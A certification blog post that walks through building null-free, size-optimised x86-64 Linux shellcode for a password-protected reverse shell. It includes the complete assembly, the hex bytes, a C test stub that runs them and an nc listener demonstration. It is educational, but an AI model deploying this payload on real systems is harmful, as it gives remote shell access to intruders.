Assignment #2 – Reverse shell with password
===========================================

The objective of this assignment was to create a shellcode that connects back to a certain IP and port and, if provided with the correct password, spawns a shell. The final shellcode must not have any null bytes.

Writing the reverse shell
-------------------------

I started by writing the reverse shell itself, with no password. To do this it's easier to start from a C version like the one below. This code has no error checking at all; and the shellcode won't have either.

    #include <stdlib.h>
    #include <unistd.h>
    #include <strings.h>
    #include <arpa/inet.h>

    int main(int argc, char **argv)
    {
        struct sockaddr_in server;
        int sock;
        char *arguments[] = {"/bin/sh", 0};
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
            
        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[1]));
        server.sin_addr.s_addr = inet_addr("127.0.0.1");
        bzero(&server.sin_zero, 8);
                
        connect(sock, (struct sockaddr *)&server, sizeof(server));

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        execve(arguments[0], arguments, NULL);
    }

Breaking it down we have seven parts:

  1. `socket()`. Create a socket to use in communications
  1. `connect()`. Connect the socket to an address and port
  1. `dup2()`. Duplicate file descriptors to connect `stdin`, `stdout` and `stderr` to the incoming connection
  1. `execve()`. Replace the current process image with `/bin/sh`

With the C code as reference each of these parts was implemented in assembly as follows.

----

### `socket()`

You need to call [`socket(2)`][man_2_socket] with the appropriate arguments. To figure out the values of the macros `AF_INET` and `SOCK_STREAM` you can use Python:

    $ python3
    >>> import socket
    >>> socket.AF_INET
    <AddressFamily.AF_INET: 2>
    >>> socket.SOCK_STREAM
    <SocketKind.SOCK_STREAM: 1>

The numbers for syscalls can be found in `/usr/include/asm/unistd_64.h`. From that file we know `socket` corresponds to syscall 41.

    ...
    #define __NR_socket 41
    #define __NR_connect 42
    #define __NR_accept 43
    ...

You prepare to execute a syscall by putting its number in RAX and its arguments in RDI, RSI, RDX, R10, R8, R9, in that order. Lastly, you execute the syscall with the `syscall` instruction. The return value of the syscall is stored in RAX. With all this information we are able to write the following code.

    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov rdi, rax

The return value is moved to RDI for later use as an argument for other syscalls.

### `connect()`

Calling [`connect(2)`][man_2_connect] is probably the part of this shellcode most prone to confusion. The first argument is the ID (know as "file descriptor") of the socket created by `socket`.

The second argument is a pointer to a structure of the type `sockaddr_in`. So you need to create this structure in memory and then get a pointer to it. To understand this structure [Beej's Guide to Network Programming][beej_sockaddr_in] is a valuable resource. We see `sockaddr_in` is declared as follows:

    struct sockaddr_in {
        short            sin_family;
        unsigned short   sin_port;
        struct in_addr   sin_addr;
        char             sin_zero[8];
    };

This definition lets you know the memory layout for the structure. `sin_family` and `sin_port` are `short` which corresponds to 2 bytes. `sin_addr` is a `struct in_addr` which from Beej's Guide you can see corresponds to a `long`, i.e. 4 bytes. And lastly `sin_zero` is an 8-`char` array, or 8 bytes in total. So the memory layout of `sockaddr_in` in the stack can be represented as follows:

      0         1   2         3   4                       7
    +------+------+------+------+------+------+------+------+
    | sin_family  |  sin_port   |         sin_addr          |    ↑ lower addresses
    +------+------+------+------+------+------+------+------+    |  stack
    |                       sin_zero                        |    | higher addresses
    +------+------+------+------+------+------+------+------+

Since the stack grows from higher to lower addresses, the structure members are pushed onto the stack in reverse order from the one they appear in the declaration: `sin_zero`, then `sin_addr`, `sin_port` and lastly `sin_family`.

In the C code you can see the port to bind to is passed to `htons()`. On x86(-64) this function basically swaps the two bytes of the port number. So if you pass 0x0d3d to `htons()` it would return 0x3d0d on such a system. Why is this needed? Because the [endianness][endianness] of the processor (little-endian) is not the same as that used by the network (big-endian). So you have to reverse the bytes of port numbers (and IP addresses) so that the network understands you. And that is precisely what `htons()` or "host-to-network-short" does. You can use Python to do these conversions:

    $ python3
    >>> import socket
    >>> hex(socket.htons(4444))
    '0x5c11'
    socket.inet_aton("127.0.0.1").hex()
    '7f000001'

At last, the third argument to the `bind` syscall is the size of the address structure, which as seen in the memory diagram above is 16 bytes.

    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
    ; bzero(&server.sin_zero, 8);
    ; AF_INET = 2
    ;
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    ; __NR_connect = 42

    xor rax, rax
    push rax          ; bzero()
    mov dword [rsp-4], 0x0100007f
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; connect
    mov rax, 42
    mov rsi, rsp
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall

### `dup2()`

These [`dup(2)`][man_2_dup2] syscalls will make sure all keystrokes arriving through the connection are passed to the process that will be spawned (`/bin/sh`) and that its output and errors goes back into the connection.

    ; dup2(sock, 0);
    ; dup2(sock, 1);
    ; dup2(sock, 2);
    ; __NR_dup2 = 33

    mov rax, 33
    mov rdi, rbx
    xor rsi, rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

### `execve()`

The shell is spawned by this part of the shellcode. I decided to use the execve stack method, which consists in calling [`execve(2)`][man_2_execve] after pushing its arguments to the stack.

    ; int execve(const char *path, char *const argv[], char *const envp[])
    ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
    ; rsi, argv = (char**) (/bin//sh, 0x00)
    ; rdx, envp = &0x00

    xor rax, rax
    push rax
    mov rdx, rsp ; *rdx = &0x00

    mov rsi, 0x68732f2f6e69622f
    push rsi
    mov rdi, rsp ; rdi = (char*) /bin//sh

    push rax
    push rdi
    mov rsi, rsp ; rsi = (char**) (/bin//sh, 0x00)

    mov al, 59
    syscall

We now have a TCP reverse shell. Next we're going to password protect it.

Adding a password
-----------------

To password protect the shell we need to do two things:

1. define a password
1. read a password from the user
1. compare it with the correct password

If the password is correct the shellcode spawns a shell, otherwise it quits. I defined a few objectives for this shellcode that were not specified in the assignment:

- I wanted the password to be of *any size* up to at least 16 bytes
- and that it would be trivial to change the password, no special knowledge needed

### Define the password

Just define the bytes (`db`) of the password. It will also come in handy to know the size of the password. You could hardcode it, but instead I defined a byte that will have the result of `$-password`, i.e. subtract the address of the current line (`$`) to that of the `password` label, which gives us the length of the password.

This definition will allow to change the shellcode's password trivially by changing the first line.

    password: db "pass"
    pass_len: db $-password

### Read the password

We need to read input from the user. How do we do this? We use the [`read(2)`][man_2_read] syscall. We need to pass it which file descriptor to read from, the address where to read to, and how many bytes to read. The file description we want will be the one that was returned by `accept`, so that the password is read from the TCP connection. However, I started by reading from `stdin`, which corresponds to file descriptor 0 (from [`man stdin`][man_3_stdin]). This way I was able to test the password part of the code separately from the network part, to ease testing.

I picked the read size as 16, so the shellcode will work correctly with passwords up to 16 bytes. To increase this limit all that needs to be done is changing 16 to a greater value.

    ; read(int fd, void *buf, size_t count)

    mov rax, 0
    mov rdi, 0    ; fd
    sub rsp, 16   ; create space for "buf" in the stack
    mov rsi, rsp  ; rsi = *buf
    mov rdx, 16
    syscall

### Compare the passwords

To compare the passwords we have to compare the value in the memory written to by `read` with the bytes defined in the `password` label. Quick question: how many bytes do we need to compare?

1. The number returned by `read` ("On success, the number of bytes read is returned")
1. As many as the length of `password`

Which did you pick? Picking the wrong one would result in a trivial authentication bypass ;) Answer below.

To compare the passwords you could write a loop. Instead, I chose to leverage the `repz` instruction combined with `cmpsb`. `repz` repeats an instruction while RCX is not zero and ZF is set, decrementing RCX after each repetition; while `cmpsb` compares the byte at the address in RSI with the one at the address in RDI, updates the flags register and increments/decrements RSI and RDI according to the direction flag (DF).

The result is that `repz` will stop repeating when the length to compare (in RCX) reaches 0 or a byte of the passwords does not match. To know which happened we can check the ZF flag: if it's not set it means `repz` ended because of a non-matching byte and the password is wrong. In that case we call `exit`. Otherwise the password is correct and we spawn the shell.

        xor rcx, rcx
        mov cl, [rel pass_len]
        lea rdi, [rel password]
        cld
        repz cmpsb
        jne exit

        ; spawn the shell

    exit:
        mov rax, 60
        syscall

Answer: you should pick the second option.

Complete shellcode
------------------

At this point we have a complete shellcode for a password-protected TCP reverse shell! Yay! But if you assemble this shellcode you will see it's full of null bytes (see below). We'll take care of that in the next section.

Regarding the shellcode size right now we have 211 bytes. This can be improved.

    $ objdump -d reverse-shell-pass.o | grep -P ":\t" | cut -f2 | tr -d ' \n' | sed -e 's/../\\x&/g' | grep -o x | tr -d '\n' | wc -c
    164

Unoptimised shellcode:

    global _start

    _start:
        jmp real_start
        password: db "pass"
        pass_len: db $-password

    real_start:
    socket:
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; __NR_socket = 41

        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall

        mov rdi, rax

    connect:
        ; server.sin_family = AF_INET;    short
        ; server.sin_port = htons(4444);    unsigned short
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
        ; bzero(&server.sin_zero, 8);
        ; AF_INET = 2
        ;
        ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
        ; struct sockaddr_in {
        ;     short            sin_family;
        ;     unsigned short   sin_port;
        ;     struct in_addr   sin_addr;
        ;     char             sin_zero[8];
        ; };
        ;
        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
        ; __NR_connect = 42

        xor rax, rax
        push rax          ; bzero()
        mov dword [rsp-4], 0x0100007f
        sub rsp, 4
        push word 0x5c11  ; htons(4444)
        push word 2

        ; connect
        mov rax, 42
        mov rsi, rsp
        mov rdx, 16  ; sizeof(sockaddr_in)
        syscall

    dup2:
        ; dup2(sock, 0);
        ; dup2(sock, 1);
        ; dup2(sock, 2);
        ; __NR_dup2 = 33

        mov rax, 33
        xor rsi, rsi
        syscall

        mov rax, 33
        inc rsi
        syscall

        mov rax, 33
        inc rsi
        syscall

    read_password:
        ; read(int fd, void *buf, size_t count)
        ; On success, the number of bytes read is returned

        xor eax, eax
        ;rdi = "sock"  ; already done
        push rax
        push rax       ; create space for "buf" in the stack
        push rsp
        pop rsi        ; rsi = *buf
        mov dl, 16
        syscall

    compare_password:
        xor ecx, ecx
        mov cl, [rel pass_len]
        lea rdi, [rel password]
        cld
        repz cmpsb
        jne exit

    execve:
        ; int execve(const char *path, char *const argv[], char *const envp[])
        ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
        ; rsi, argv = (char**) (/bin//sh, 0x00)
        ; rdx, envp = &0x00

        xor rax, rax
        push rax
        mov rdx, rsp ; *rdx = &0x00

        mov rsi, 0x68732f2f6e69622f
        push rsi
        mov rdi, rsp ; rdi = (char*) /bin//sh

        push rax
        push rdi
        mov rsi, rsp ; rsi = (char**) (/bin//sh, 0x00)

        mov al, 59
        syscall

    exit:
        ;xor eax, eax  ; upper bytes are zero after read
        mov al, 60
        syscall

Shellcode disassembly revealing nulls:

    $ nasm -felf64 reverse-shell-pass.nasm
    $ objdump -M intel -d reverse-shell-pass.o

    reverse-shell-pass.o:     file format elf64-x86-64

    Disassembly of section .text:

    0000000000000000 <_start>:
       0:	eb 05                	jmp    7 <real_start>

    0000000000000002 <password>:
       2:	70 61                	jo     65 <read_password+0x1>
       4:	73 73                	jae    79 <compare_password+0xb>

    0000000000000006 <pass_len>:
       6:	04                   	.byte 0x4

    0000000000000007 <real_start>:
       7:	b8 29 00 00 00       	mov    eax,0x29
       c:	bf 02 00 00 00       	mov    edi,0x2
      11:	be 01 00 00 00       	mov    esi,0x1
      16:	ba 00 00 00 00       	mov    edx,0x0
      1b:	0f 05                	syscall 
      1d:	48 89 c7             	mov    rdi,rax

    0000000000000020 <connect>:
      20:	48 31 c0             	xor    rax,rax
      23:	50                   	push   rax
      24:	c7 44 24 fc 7f 00 00 	mov    DWORD PTR [rsp-0x4],0x100007f
      2b:	01 
      2c:	48 83 ec 04          	sub    rsp,0x4
      30:	66 68 11 5c          	pushw  0x5c11
      34:	66 6a 02             	pushw  0x2
      37:	b8 2a 00 00 00       	mov    eax,0x2a
      3c:	48 89 e6             	mov    rsi,rsp
      3f:	ba 10 00 00 00       	mov    edx,0x10
      44:	0f 05                	syscall 

    0000000000000046 <dup2>:
      46:	b8 21 00 00 00       	mov    eax,0x21
      4b:	48 31 f6             	xor    rsi,rsi
      4e:	0f 05                	syscall 
      50:	b8 21 00 00 00       	mov    eax,0x21
      55:	48 ff c6             	inc    rsi
      58:	0f 05                	syscall 
      5a:	b8 21 00 00 00       	mov    eax,0x21
      5f:	48 ff c6             	inc    rsi
      62:	0f 05                	syscall 

    0000000000000064 <read_password>:
      64:	31 c0                	xor    eax,eax
      66:	50                   	push   rax
      67:	50                   	push   rax
      68:	54                   	push   rsp
      69:	5e                   	pop    rsi
      6a:	b2 10                	mov    dl,0x10
      6c:	0f 05                	syscall 

    000000000000006e <compare_password>:
      6e:	31 c9                	xor    ecx,ecx
      70:	8a 0d 90 ff ff ff    	mov    cl,BYTE PTR [rip+0xffffffffffffff90]        # 6 <pass_len>
      76:	48 8d 3d 85 ff ff ff 	lea    rdi,[rip+0xffffffffffffff85]        # 2 <password>
      7d:	fc                   	cld    
      7e:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
      80:	75 1e                	jne    a0 <exit>

    0000000000000082 <execve>:
      82:	48 31 c0             	xor    rax,rax
      85:	50                   	push   rax
      86:	48 89 e2             	mov    rdx,rsp
      89:	48 be 2f 62 69 6e 2f 	movabs rsi,0x68732f2f6e69622f
      90:	2f 73 68 
      93:	56                   	push   rsi
      94:	48 89 e7             	mov    rdi,rsp
      97:	50                   	push   rax
      98:	57                   	push   rdi
      99:	48 89 e6             	mov    rsi,rsp
      9c:	b0 3b                	mov    al,0x3b
      9e:	0f 05                	syscall 

    00000000000000a0 <exit>:
      a0:	b0 3c                	mov    al,0x3c
      a2:	0f 05                	syscall 

Removing nulls
--------------

We're almost done. Now we want to remove nulls. From the `objdump` above you can see all null bytes are in `mov` instructions with immediate values. To remove these we can move/add to lower parts of the registers, instead of moving 64-bit values (whose higher bytes are nulls). But you need to make sure the higher part of the register is zeroed before (typically by xoring the register with itself).

Example:

    mov rax, 41     ; b8 29 00 00 00

    ; can be rewritten as

    xor rax, rax    ; 48 31 c0
    mov al, 41      ; b0 29

Since the IP to connect to may include null bytes (127.0.0.1 for example does) we also need a way to transform this IP in a way that there are no null bytes. This can be accomplished for example by xoring the IP with some other value which does not cointain null values either. With this in mind:

    push 0x0100007f   ; sin_addr

    ; can be rewritten as

    push 0x10ffff70   ; sin_addr (xored)
    xor dword [rsp], 0x11ffff0f ; recover sin_addr

To verify this you can use python:

    $ python3
    >>> hex(0x10ffff70 ^ 0x11ffff0f)
    '0x100007f'
    >>> import ipaddress
    >>> ipaddress.ip_address(0x10ffff70 ^ 0x11ffff0f)
    IPv4Address('1.0.0.127')

Optimising
----------

Removing the null bytes reduced the shellcode size. But can we do better? Yes, we can.

To do this my process was to go through each part of the code and think about and try optimisations for each. It involved trial and error (assembling and disassembling) to understand which equivalent instructions could be used that were shorter. The [Intel development manuals][intel_sdm] and/or [this site][felixcloutier_x86] are also useful. Below I'll explain my main optimisations.

<!-- it sees rasm2 is not 100% trustable. for example it assembles pop eax, which is invalid in 64-bit mode

To ease taking a look at the length of opcodes you can leverage Radare2's `rasm2` to interactively get the opcodes for instructions:

    $ cat | xargs -I{} rasm2 -a x86 -b64 {} | sed -e 's/../& /g'
    xor rax, rax
    48 31 c0
    mov al, 41
    b0 29

Or non-interactively:

    $ echo -e 'xor rax, rax \n mov al, 41' | xargs -I{} rasm2 -a x86 -b64 {} | sed -e 's/../& /g'
    48 31 c0
    b0 29

The `sed` part is optional. It's just so the output is for example `48 31 c0` instead of `4831c0`.

For instructions with labels, such as `jne exit` and `lea rdi, [rel password]`, this method won't work and you should assemble and disassemble to look at the opcodes. In these cases it might be useful to disassemble just part of the code, for example if you want do disassemble only from the label `check_password` until the next label you can use:

    objdump -M intel bind-shell-pass.o --disassemble=check_password
--- -->

### xor self/mov imm vs push imm/pop

At the beginning of our shellcode we have no guarantee about the values in the registers. So to set RAX to 41, without nulls, we can do something as:

    xor rax, rax
    mov al, 41

    48 31 c0
    b0 29

This takes 5 bytes. However, the same can be accomplished by pushing the immediate value and popping to the 64-bit register, which ensures the upper bytes of the register will be overwritten.

    push 41
    pop rax

    6a 29
    58

As you can see we reduce 2 bytes for each of these substitutions.

### xor r64, r64 vs xor r32, r32

Xoring registers to zero them is a common operation. Xoring 64-bit registers takes 3 bytes:

    xor rax, rax

    48 31 c0

However we can obtain the same effect by xoring only the lower 32 bits, which takes only 2 bytes.

    xor eax, eax

    31 c0

What will happen to the upper 32 bits, you may ask? When you write to the lower 32 bits of a register the upper 32 bits are reset so we're good for zeroing.

> When in 64-bit mode, operand size determines the number of valid bits in the destination general-purpose register:
> - 64-bit operands generate a 64-bit result in the destination general-purpose register.
> - **32-bit operands generate a 32-bit result, zero-extended to a 64-bit result in the destination general-purpose register.**
> - 8-bit and 16-bit operands generate an 8-bit or 16-bit result. The upper 56 bits or 48 bits (respectively) of the destination general-purpose register are not modified by the operation.

### xor edx, edx vs cdq

This is very specific, but if you know that the 31st bit of RAX is zero and want to zero RDX you can use [`cdq`][cdq]. This instruction copies RAX's bit 31 to all bits of EDX, hence zeroing RDX. We save one byte.

    xor edx, edx
    31 d2

    cdq
    99

### Reserving stack space

Reserving space on the stack involves adjusting RSP by subtracting the number of bytes to reserve. In some cases you might also need to initialise the reserved bytes. This was the case when preparing the structure for `socket`. We wanted to reserve 4 bytes for `sin_addr` and initialise them with the IP address. I wrote it like this:

    xor eax, eax
    mov dword [rsp-4], 0x0100007f
    sub rsp, 4

    31 c0
    c7 44 24 fc 7f 00 00 01
    48 83 ec 04

As you can see the `mov` took 8 bytes and `sub` took 4. Is there another instruction that can adjust RSP and write to the stack? Yes, `push` does that. So we can write the same as follows:

    xor eax, eax
    push 0x0100007f

    31 c0
    68 7f 00 00 01

So we are able to reduce those 12 bytes to just 5.

### mov r64, r64 vs push r64/pop r64

Another common operation is to move values between 64-bit registers. The opcodes for these operations use 3 bytes:

    mov rbx, rax

    48 89 c3

As you may have noticed, pushing and popping 64-bit registers results in 1-byte opcodes. Therefore, we can rewrite 64-bit register moves a `push` followed by a `pop`:

    push rax
    pop rbx

    50
    5b

We save 1 byte for each of these operations.

### Take advantage of syscall return values

Syscall return values are placed in RAX. On success most syscalls return a non-negative integer. This come can in handy because it might help with the initialisations of RAX. For example to call `dup2` we need `rax=33`. Normally we'd write for example:

    xor rax, rax
    mov al, 33

However, since before calling `dup2` we call `connect`, which on success returns zero, we can drop the xor and save an instruction. Even if a syscall does not return zero, if it returns a small positive integer we know the upper bytes of RAX will be zeroed.

### Pushing the password

In the password comparison part I used two relative addressing instructions:

    xor ecx, ecx
    mov cl, [rel pass_len]
    lea rdi, [rel password]
    cld
    repz cmpsb
    jne exit

If we disassemble these instructions we see that unfortunately the relative offsets adds six 0xff:

    8a 0d ae ff ff ff       mov    cl,BYTE PTR [rip+0xffffffffffffffae]   # 6 <pass_len>
    48 8d 3d a3 ff ff ff    lea    rdi,[rip+0xffffffffffffffa3]           # 2 <password>

It would be nice to get rid of those 0xff. I could find no way to shorten the offset. But we could get rid of the offsets altogether by pushing the correct password and its length to the stack before we do the comparison.

    push dword 0x73736170  ; password "pass"
    push 4                 ; password length
    pop rcx
    push rsp
    pop rdi        ; rdi = *password
    cld
    repz cmpsb
    jne exit

I tried this and after adjusting the code to this change 12 bytes were saved. However, I opted *not to use* this optimisation in the final shellcode. Why? Because I wanted the password to be trivial to change. Changing the password in the code above would require not only to calculate the new number to push but also to modify the instructions. Imagine you wanted to use "foobar" as the password instead: a single push of 4 bytes would no longer work, you'd have to add another push of 2 bytes. Oh, and don't forget to change the length of the password! Compare this with the ease of just typing in a new password.

Conclusion
----------

We're done. The shellcode works, it has no nulls and we've shortened it. The final shellcode is at the end.

    $ nasm -felf64 bind-shell-pass.nasm
    $ objdump -d bind-shell-pass.o | grep -P ":\t" | cut -f2 | tr -d ' \n' | sed -e 's/../\\x&/g'
    \xeb\x05\x70\x61\x73\x73\x04\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x31\xc0\x50\x68\x70\xff\xff\x10\x81\x34\x24\x0f\xff\xff\x11\x66\x68\x11\x5c\x66\x6a\x02\x04\x2a\x54\x5e\x80\xc2\x10\x0f\x05\x6a\x02\x5e\xb0\x21\x0f\x05\xff\xce\x79\xf8\x50\x50\x54\x5e\xb2\x10\x0f\x05\x31\xc9\x8a\x0d\xb7\xff\xff\xff\x48\x8d\x3d\xac\xff\xff\xff\xfc\xf3\xa6\x75\x1a\x31\xc0\x50\x54\x5a\x48\xbe\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05\xb0\x3c\x0f\x05

Let's put the shellcode in a C test stub:

    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\xeb\x05\x70\x61\x73\x73\x04\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50"
    "\x5f\x31\xc0\x50\x68\x70\xff\xff\x10\x81\x34\x24\x0f\xff\xff\x11\x66\x68\x11\x5c"
    "\x66\x6a\x02\x04\x2a\x54\x5e\x80\xc2\x10\x0f\x05\x6a\x02\x5e\xb0\x21\x0f\x05\xff"
    "\xce\x79\xf8\x50\x50\x54\x5e\xb2\x10\x0f\x05\x31\xc9\x8a\x0d\xb7\xff\xff\xff\x48"
    "\x8d\x3d\xac\xff\xff\xff\xfc\xf3\xa6\x75\x1a\x31\xc0\x50\x54\x5a\x48\xbe\x2f\x62"
    "\x69\x6e\x2f\x2f\x73\x68\x56\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05\xb0\x3c\x0f"
    "\x05";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

Compile it:

    $ gcc -Wall -z execstack shellcode.c -o shellcode

On the attacker's machine open a port to listen at:

    $ nc -vlp 4444 localhost

On the victim's machine execute the shellcode:

    $ ./shellcode
    length: 121

And finally the attacker will receive a connection they can use:

    Connection from 127.0.0.1:60978
    pass
    whoami
    goncalor

As you can see removing the nulls and optimising reduced the size from 164 down to 121 bytes. A 26% cut.

That is all. Thank you for reading. Final shellcode below.

    global _start

    _start:
        jmp real_start
        password: db "pass"
        pass_len: db $-password

    real_start:
    socket:
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; __NR_socket = 41
        ; On success, a file descriptor for the new socket is returned

        push 41
        pop rax
        push 2
        pop rdi
        push 1
        pop rsi
        cdq       ; copies rax's bit 31 to all bits of edx (zeroes rdx)
        syscall

        push rax
        pop rdi

    connect:
        ; server.sin_family = AF_INET;    short
        ; server.sin_port = htons(4444);    unsigned short
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
        ; bzero(&server.sin_zero, 8);
        ;
        ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
        ; struct sockaddr_in {
        ;     short            sin_family;
        ;     unsigned short   sin_port;
        ;     struct in_addr   sin_addr;
        ;     char             sin_zero[8];
        ; };
        ;
        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
        ; AF_INET = 2
        ; __NR_connect = 42
        ; On success, zero is returned

        xor eax, eax
        push rax          ; sin_zero
        push 0x10ffff70   ; sin_addr (xored)
        xor dword [rsp], 0x11ffff0f ; recover sin_addr
        push word 0x5c11  ; htons(4444)
        push word 2

        ; connect
        add al, 42
        push rsp
        pop rsi
        add dl, 16    ; sizeof(sockaddr_in)
        syscall

    dup2:
        ; dup2(sock, 0);
        ; dup2(sock, 1);
        ; dup2(sock, 2);
        ; __NR_dup2 = 33
        ; On success, return the new file descriptor

        push 2
        pop rsi

    dup2_loop:
        mov al, 33
        syscall
        dec esi
        jns dup2_loop

    read_password:
        ; read(int fd, void *buf, size_t count)
        ; On success, the number of bytes read is returned

        ;xor eax, eax  ; already done by dup2
        ;rdi = "sock"  ; already done
        push rax
        push rax       ; create space for "buf" in the stack
        push rsp
        pop rsi        ; rsi = *buf
        mov dl, 16
        syscall

    compare_password:
        xor ecx, ecx
        mov cl, [rel pass_len]
        lea rdi, [rel password]
        cld
        repz cmpsb
        jne exit

    execve:
        ; execve(const char *path, char *const argv[], char *const envp[])
        ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
        ; rsi, argv = (char**) (/bin//sh, 0x00)
        ; rdx, envp = &0x00

        xor eax, eax
        push rax
        push rsp
        pop rdx      ; *rdx = &0x00

        mov rsi, 0x68732f2f6e69622f
        push rsi
        push rsp
        pop rdi      ; rdi = (char*) /bin//sh

        push rax
        push rdi
        push rsp
        pop rsi      ; rsi = (char**) (/bin//sh, 0x00)

        mov al, 59
        syscall

    exit:
        ;xor eax, eax  ; upper bytes are zero after read
        mov al, 60
        syscall

[man_2_socket]: https://linux.die.net/man/2/syscall
[man_2_connect]: https://linux.die.net/man/2/bind
[man_2_dup2]: https://linux.die.net/man/2/dup2
[man_2_execve]: https://linux.die.net/man/2/execve
[man_2_read]: https://linux.die.net/man/2/read
[man_3_stdin]: https://linux.die.net/man/3/stdin
[beej_sockaddr_in]: https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
[endianness]: https://en.wikipedia.org/wiki/Endianness
[intel_sdm]: https://software.intel.com/en-us/articles/intel-sdm
[felixcloutier_x86]: https://www.felixcloutier.com/x86/
[cdq]: https://www.felixcloutier.com/x86/cwd:cdq:cqo

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
